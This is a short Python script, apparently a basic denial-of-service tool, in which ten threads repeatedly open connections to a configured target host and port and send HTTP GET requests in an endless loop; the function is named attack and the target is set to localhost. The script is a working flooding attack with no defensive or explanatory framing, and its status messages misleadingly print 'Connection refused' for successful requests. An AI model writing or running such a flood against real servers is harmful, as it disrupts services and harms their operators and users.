import threading
import socket

target ="127.0.0.1"
port =8080
f="192.168.1.1"
con=0

def attack():
    while True:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.send(("GET / HTTP/1.1\r\nHost: " + target + "\r\n\r\n").encode('ascii'))
        s.close()
        global con
        con+=1
        if con%10==0:
            print("yes")
        else:
            print("Connection refused")

for i in range(10):
    thread=threading.Thread(target=attack)
    thread.start()
